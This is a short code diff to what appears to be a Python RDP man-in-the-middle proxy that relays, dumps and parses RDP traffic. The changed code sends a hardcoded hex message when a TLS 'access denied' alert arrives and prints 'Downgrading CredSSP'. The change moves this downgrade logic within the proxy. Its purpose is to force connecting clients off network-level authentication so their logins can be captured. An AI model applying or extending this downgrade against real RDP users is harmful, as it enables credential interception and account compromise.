@@ -741,10 +741,13 @@ def forward_data():
             data = read_data(s_in)
         except ssl.SSLError as e:
             if "alert access denied" in str(e):
-                print("Downgrading CredSSP")
-                local_conn.send(unhexlify(b"300da003020104a4060204c000005e"))
+                print("TLS alert access denied, Downgrading CredSSP")
+                #  local_conn.send(unhexlify(b"300da003020104a4060204c000005e"))
+                data = b"300da003020104a4060204c000005e"
+                to_socket.send(data)
+                return False
             else:
-                print("SSLError: %s" % str(e))
+                raise
         if data == b"": return close()
         dump_data(data, From=From)
         parse_rdp(data, From=From)
@@ -775,14 +778,12 @@ def run():
                 break
         except (ssl.SSLError, ssl.SSLEOFError) as e:
             print("SSLError: %s" % str(e))
-            if "alert access denied" in str(e):
-                print("Downgrading CredSSP")
-                local_conn.send(unhexlify(b"300da003020104a4060204c000005e"))
         except (ConnectionResetError, OSError):
             print("The client has disconnected")
 
 
 local_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+local_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 local_socket.bind((args.bind_ip, args.listen_port))
 local_socket.listen()
 
@@ -793,4 +794,3 @@ except KeyboardInterrupt:
     pass
 finally:
     local_socket.close()
-    #  close()
